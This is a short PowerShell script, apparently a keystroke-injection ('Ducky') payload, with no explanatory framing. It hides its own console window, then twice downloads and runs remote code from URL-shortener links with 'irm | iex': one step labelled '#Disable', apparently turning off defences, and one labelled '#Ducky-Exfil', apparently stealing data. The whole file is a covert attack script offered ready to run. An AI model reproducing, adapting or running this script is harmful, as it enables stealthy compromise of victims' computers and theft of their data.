#Hide-Powershell
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll", ExactSpelling = true)]
    public static extern IntPtr GetConsoleWindow();
}
"@

$SW_HIDE = 0;
$consolePtr = [User32]::GetConsoleWindow();
[User32]::ShowWindow($consolePtr, $SW_HIDE);

#Disable
irm https://rb.gy/kce89x | iex;
Start-Sleep -Seconds 5;

#Ducky-Exfil
irm https://rb.gy/xzpj1d | iex;
Start-Sleep -Seconds 5;
exit;
